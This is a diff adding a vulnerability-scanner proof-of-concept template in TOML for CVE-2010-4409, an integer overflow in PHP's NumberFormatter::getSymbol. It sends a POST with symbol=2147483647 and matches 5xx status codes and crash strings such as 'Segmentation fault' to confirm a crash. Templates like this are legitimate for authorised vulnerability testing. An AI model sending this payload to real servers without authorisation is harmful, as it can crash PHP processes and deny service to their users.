@@ -1,0 +1,51 @@
+[info]
+author = "ave"
+description = "验证 PHP NumberFormatter::getSymbol 整数溢出漏洞 (CVE-2010-4409)，通过构造恶意参数触发整数溢出导致 PHP 进程崩溃拒绝服务"
+id = "POC-AVE-2010-0280"
+name = "CVE-2010-4409 PoC"
+severity = "medium"
+tags = ["ave-2010-0280"]
+vuln_id = [
+    "CVE-2010-4409",
+    "AVE-2010-0280",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{CVE_2010_4409_POC_PATH}}"
+protocol = "http"
+
+[poc.requests.body]
+content = "symbol=2147483647"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "status"
+status = [
+    500,
+    502,
+    503,
+    504,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Segmentation fault",
+    "SIGSEGV",
+    "Segmentation violation",
+    "zend_mm_heap corrupted",
+    "Allowed memory size exhausted",
+    "Fatal error",
+]
